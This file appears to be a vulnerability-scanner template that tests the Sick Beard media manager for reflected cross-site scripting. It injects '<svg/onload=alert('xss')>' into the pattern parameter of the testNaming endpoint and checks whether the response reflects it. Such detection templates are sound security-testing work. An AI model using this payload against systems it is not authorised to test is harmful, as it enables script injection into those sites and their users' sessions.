id: Sick Beard XSS
info:
  author: pikpikcu
  name: Sick Beard XSS
  severity: medium
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - <svg/onload=alert('xss')>
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/config/postProcessing/testNaming?pattern=<svg/onload=alert(''xss'')>'
